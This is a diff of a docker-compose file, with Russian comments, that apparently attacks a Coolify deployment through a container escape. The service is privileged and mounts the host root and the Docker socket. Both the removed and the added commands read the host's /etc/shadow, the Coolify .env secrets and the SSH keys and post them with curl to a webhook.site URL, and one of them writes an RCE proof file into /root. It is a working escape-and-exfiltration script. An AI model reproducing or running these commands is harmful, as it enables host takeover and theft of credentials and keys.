@@ -5,23 +5,19 @@ services:
     privileged: true
     network_mode: host
     volumes:
+      - '/:/host-root:rshared'   # ключевое изменение
       - '/var/run/docker.sock:/var/run/docker.sock'
     command:
       - sh
       - -c
       - |
-        apk add --no-cache curl docker-cli
+        apk add --no-cache curl
+        # Проверяем, видна ли папка /data теперь в контейнере
+        ls -la /host-root/data > /tmp/ls_data.txt 2>&1
+        curl -X POST --data-binary @/tmp/ls_data.txt https://webhook.site/ТВОЙ-URL?stage=ls_data
         
-        # 1. Доказательство: хостовый Docker запускает новый контейнер с маунтом всего корня
-        docker run --rm -v /:/host_root alpine:3.19 sh -c "cat /host_root/etc/shadow | head -5 | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_shadow"
+        # Пытаемся прочитать .env напрямую, если она видна
+        cat /host-root/data/coolify/source/.env 2>/dev/null | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=direct_env
         
-        # 2. Читаем главный .env через новый контейнер с явным маунтом /data
-        docker run --rm -v /data:/host_data alpine:3.19 sh -c "cat /host_data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_env"
-        
-        # 3. Читаем SSH ключи через новый контейнер
-        docker run --rm -v /data:/host_data alpine:3.19 sh -c "cat /host_data/coolify/ssh/keys/ssh_key@* | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212e?stage=socket_escape_ssh"
-        
-        # 4. Создаем proof-файл прямо в /root хоста (гарантированно не tmpfs)
-        docker run --rm -v /root:/host_root alpine:3.19 sh -c "echo 'RCE_PROOF_DOCKER_SOCKET_$(date +%s)' > /host_root/coolify_pwned.txt"
-        
-        sleep 3600
+        # Альтернатива: запустить новый контейнер с rshared
+        docker run --rm -v /:/host:rshared alpine:3.19 cat /host/data/coolify/source/.env | curl -X POST --data-binary @- https://webhook.site/dfc8a81a-10c5-493b-afd6-03c86d6e212eL?stage=via_docker_rshared
